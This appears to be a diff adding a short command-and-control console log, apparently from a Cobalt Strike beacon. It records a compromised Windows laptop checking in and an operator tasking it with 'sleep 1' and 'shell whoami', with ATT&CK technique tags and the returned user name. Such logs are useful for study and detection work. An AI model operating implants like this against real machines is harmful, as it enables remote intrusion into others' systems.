@@ -1,0 +1,14 @@
+12/19 12:39:25 UTC [metadata] 120.230.87.173 <- 192.168.56.107; computer: LAPTOP-P9197NDV; user: jufan; process: hha.exe; pid: 14284; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+12/19 12:39:44 UTC [input] <s09> sleep 1
+12/19 12:39:44 UTC [task] <T1029> Tasked beacon to sleep for 1s
+12/19 12:39:59 UTC [checkin] host called home, sent: 16 bytes
+12/19 12:40:01 UTC [input] <s09> shell whoami
+12/19 12:40:01 UTC [task] <T1059> Tasked beacon to run: whoami
+12/19 12:40:01 UTC [checkin] host called home, sent: 37 bytes
+12/19 12:40:02 UTC [output]
+received output:
+laptop-p9197ndv\jufan
+
+
+12/19 12:41:55 UTC [input] <s09> shell whoami
+12/19 12:41:55 UTC [task] <T1059> Tasked beacon to run: whoami
